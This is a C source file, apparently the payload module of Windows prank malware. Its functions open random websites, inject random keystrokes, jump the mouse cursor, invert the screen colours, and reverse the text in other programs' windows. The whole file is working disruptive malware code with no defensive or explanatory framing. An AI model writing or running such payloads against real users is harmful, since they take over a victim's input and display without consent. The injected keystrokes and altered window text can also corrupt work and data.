#include <payload_function.h>
#include <data.h>
#include <util.h>

#include <Windows.h>
#include <stdio.h> //

void shell_execute(window_t* w)
{
    ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % sites_size], NULL, NULL, SW_SHOWDEFAULT);
    printf("shell_execute\n");
}

void keyboard_malfunction(window_t* w)
{
    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;

    SendInput(1, &input, sizeof(INPUT));
    printf("keyboard_malfunction\n");
}

void cursor_malfunction(window_t* w)
{
    POINT cursor;
    GetCursorPos(&cursor);

    SetCursorPos(
        cursor.x + (random() % 3 - 1) * (random() % 1000),
        cursor.y + (random() % 3 - 1) * (random() % 1000)
    );
}

void invert_colors(window_t* w)
{
    int x = w->rect.right - w->rect.left;
    int y = w->rect.bottom - w->rect.top;
    BitBlt(w->hdc, 0, 0, x, y, w->hdc, 0, 0, NOTSRCCOPY);
}

static BOOL CALLBACK enum_child_proc(HWND hwnd, LPARAM lParam)
{
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL))
    {
        reverse_string_w(str);
        SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }

    GlobalFree(str);

    return TRUE;
}

void invert_text(window_t* w)
{
    EnumChildWindows(w->hwnd, &enum_child_proc, 0);
}